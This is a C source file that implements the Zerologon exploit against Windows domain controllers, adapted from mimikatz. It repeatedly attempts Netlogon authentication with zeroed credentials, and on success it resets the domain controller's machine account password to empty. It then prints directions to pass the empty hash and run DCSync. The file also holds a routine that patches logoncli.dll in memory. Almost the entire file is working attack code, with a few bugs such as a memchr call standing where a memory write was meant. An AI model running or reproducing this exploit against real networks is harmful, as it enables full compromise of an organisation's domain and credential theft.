#include <windows.h>
#include <stdio.h>
#include <dsgetdc.h>


/*
* 
* kuhl_m_lsadump_zerologon
https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L2451-L2453

*/



//#include <lm.h>


//#pragma comment(lib, "Netapi32.lib")


typedef struct _NETLOGON_CREDENTIAL {
	CHAR data[8];
} NETLOGON_CREDENTIAL, * PNETLOGON_CREDENTIAL;

typedef struct _NETLOGON_AUTHENTICATOR {
	NETLOGON_CREDENTIAL Credential;
	DWORD Timestamp;
} NETLOGON_AUTHENTICATOR, * PNETLOGON_AUTHENTICATOR;

typedef  enum _NETLOGON_SECURE_CHANNEL_TYPE {
	NullSecureChannel = 0,
	MsvApSecureChannel = 1,
	WorkstationSecureChannel = 2,
	TrustedDnsDomainSecureChannel = 3,
	TrustedDomainSecureChannel = 4,
	UasServerSecureChannel = 5,
	ServerSecureChannel = 6,
	CdcServerSecureChannel = 7
} NETLOGON_SECURE_CHANNEL_TYPE;

typedef struct _NL_TRUST_PASSWORD {
	WCHAR Buffer[256];
	ULONG Length;
} NL_TRUST_PASSWORD, * PNL_TRUST_PASSWORD;


/*
DECLSPEC_IMPORT NTSTATUS NETAPI32$I_NetServerReqChallenge(LPWSTR PrimaryName, LPWSTR ComputerName, PNETLOGON_CREDENTIAL ClientChallenge, PNETLOGON_CREDENTIAL ServerChallenge);
DECLSPEC_IMPORT NTSTATUS NETAPI32$I_NetServerAuthenticate2(LPWSTR PrimaryName, LPWSTR AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, LPWSTR ComputerName, PNETLOGON_CREDENTIAL ClientCredential, PNETLOGON_CREDENTIAL ServerCredential, PULONG NegotiatedFlags);
DECLSPEC_IMPORT NTSTATUS NETAPI32$I_NetServerPasswordSet2(LPWSTR PrimaryName, LPWSTR AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, LPWSTR ComputerName, PNETLOGON_AUTHENTICATOR Authenticator, PNETLOGON_AUTHENTICATOR ReturnAuthenticator, PNL_TRUST_PASSWORD ClearNewPassword);
*/
#include <psapi.h>



int FindPattern(byte* buf,int bufSize, byte* pattern, int patternSize) {
	int start = 0;
	int end = bufSize - patternSize;
	byte firstByte = pattern[0];

	while (start <= end) {
		if (buf[start] == firstByte) {
			if (memcmp(buf + start, pattern, patternSize) == 0) {
				return start;
			}
			/*
			for (int offset = 1; ; ++offset) {
				if (offset == patternSize) {
					return start;
				} else if (buf[start + offset] != pattern[offset]) {
					break;
				}
			}*/
		}
		++start;
	}
	return -1;
}

BOOL PatchLogon() {
	// Patches logoncli.dll (x64) to use RPC over TCP/IP, making it work from non domain-joined
	// Credit to Benjamin Delpy @gentilkiwi for the neat trick!
	byte pattern[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0x83, 0xF8, 0x01, 0x75, 0x3B };
	HANDLE hProc = GetCurrentProcess();
	MODULEINFO modInfo;
	
	HMODULE hModule = LoadLibraryA("logoncli.dll");
	if (hModule == NULL) {
		printf("[x] Fail hModule == NULL !\n");
		return FALSE;
	}


	if (!GetModuleInformation(hProc, hModule, &modInfo, sizeof(MODULEINFO)))
		return FALSE;

	//long addr = modInfo.lpBaseOfDll.ToInt64();
	long addr = modInfo.lpBaseOfDll;
	long maxSize = addr + modInfo.SizeOfImage;

	while (addr < maxSize) {
		byte* buf = (byte*)malloc(1024);
		if (buf == NULL)
			return 0;
		SIZE_T bytesRead = 0;
		if (!ReadProcessMemory(hProc, (LPCVOID)modInfo.lpBaseOfDll, buf, 1024, &bytesRead)) {
			free(buf);
			return FALSE;
		}

		int index = FindPattern(buf, bytesRead, pattern, sizeof(pattern));
		if (index > -1) {
			DWORD oldProtect;
			long patchAddr = addr + index + 1;
			if (!VirtualProtect((LPVOID)patchAddr, 1024, 0x04, &oldProtect))
				return FALSE;

			// patch mov eax 1; => mov eax, 2;
			memchr((LPVOID)patchAddr, 0x02, sizeof(char));
			if (!VirtualProtect((LPVOID)patchAddr, 1024, oldProtect, &oldProtect))
				return FALSE;
			return TRUE;
		}
		addr += 1024;
		free(buf);
	}
	return FALSE;
}


/* DC.corp.acme.com			DC				DC$*/
BOOL go(wchar_t* dc_fqdn, wchar_t* dc_netbios, wchar_t* dc_account) {
	DWORD                  i;
	NETLOGON_CREDENTIAL    ClientCh = { 0 };
	NETLOGON_CREDENTIAL    ServerCh = { 0 };
	NETLOGON_AUTHENTICATOR Auth = { 0 };
	NETLOGON_AUTHENTICATOR AuthRet = { 0 };
	NL_TRUST_PASSWORD      NewPass = { 0 };
	ULONG                  NegotiateFlags = 0x212fffff;


	typedef NTSTATUS(WINAPI* _I_NetServerReqChallenge)(LPWSTR, LPWSTR, PNETLOGON_CREDENTIAL, PNETLOGON_CREDENTIAL);
	typedef NTSTATUS(WINAPI* _I_NetServerAuthenticate2)(LPWSTR PrimaryName, LPWSTR AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, LPWSTR ComputerName, PNETLOGON_CREDENTIAL ClientCredential, PNETLOGON_CREDENTIAL ServerCredential, PULONG NegotiatedFlags);
	typedef NTSTATUS(WINAPI* _I_NetServerPasswordSet2)(LPWSTR PrimaryName, LPWSTR AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, LPWSTR ComputerName, PNETLOGON_AUTHENTICATOR Authenticator, PNETLOGON_AUTHENTICATOR ReturnAuthenticator, PNL_TRUST_PASSWORD ClearNewPassword);


	//HMODULE hDbghelp = GetModuleHandleA("Dbghelp.dll");
	HMODULE netapi32 = LoadLibraryA("netapi32.dll");
	if (netapi32 == NULL) {
		printf("[x] Fail netapi32 == NULL !\n");
		return FALSE;
	}
	_I_NetServerReqChallenge I_NetServerReqChallenge = (_I_NetServerReqChallenge)GetProcAddress(netapi32, "I_NetServerReqChallenge");
	_I_NetServerAuthenticate2 I_NetServerAuthenticate2 = (_I_NetServerAuthenticate2)GetProcAddress(netapi32, "I_NetServerAuthenticate2");
	_I_NetServerPasswordSet2 I_NetServerPasswordSet2 = (_I_NetServerPasswordSet2)GetProcAddress(netapi32, "I_NetServerPasswordSet2");



	if (I_NetServerReqChallenge == NULL || I_NetServerAuthenticate2 == NULL || I_NetServerPasswordSet2  == NULL ) {
		printf("[x] Fail to GetProcAddress return NULL !\n");
		return FALSE;
	}


	

	for (i = 0; i < 2000; i++) {
		if (I_NetServerReqChallenge(dc_fqdn, dc_netbios, &ClientCh, &ServerCh) == 0) {
			printf("[x] Unable to complete server challenge. Possible invalid name or network issues?\n");
			//return FALSE;
		}
		if ((I_NetServerAuthenticate2(dc_fqdn, dc_account, ServerSecureChannel, dc_netbios, &ClientCh, &ServerCh, &NegotiateFlags) == 0)) {
			printf("%S 31d6cfe0d16ae931b73c59d7e0c089c0 is vurlnerable to Zerologon\n", dc_account);

			system("pause");
			if (I_NetServerPasswordSet2(dc_fqdn, dc_account, ServerSecureChannel, dc_netbios, &Auth, &AuthRet, &NewPass) == 0) {
				printf("Success! Use pth .\\%S 31d6cfe0d16ae931b73c59d7e0c089c0 and run dcscync\n", dc_account);
				return TRUE;
			} else {
				printf("Failed to set machine account pass for %S\n", dc_account);
			}
		}
		printf("Try: %i/2000\r",i+1);
	}

	printf("\n%S is not vulnerable\n", dc_fqdn);
	return FALSE;
}


int main() {
	//printf("Synopsis: zerologon [safeword] [DC.fqdn]");
	printf("[-] Zerologon exploit\n");
	//go(L"DC1.pentest.local", L"$DC1", L"DC1");
	//go(L"\\\\SERVERWIN16.pentest.local", L"SERVERWIN16", L"SERVERWIN16$");

	/*if (!PatchLogon()) {
		printf("Patching failed :(\n");
	}else
		printf("Patch successful. Will use ncacn_ip_tcp\n");
	*/

	go(L"DC1.pentest.local", L"DC1", L"DC1$");


	system("pause");
	return FALSE;
}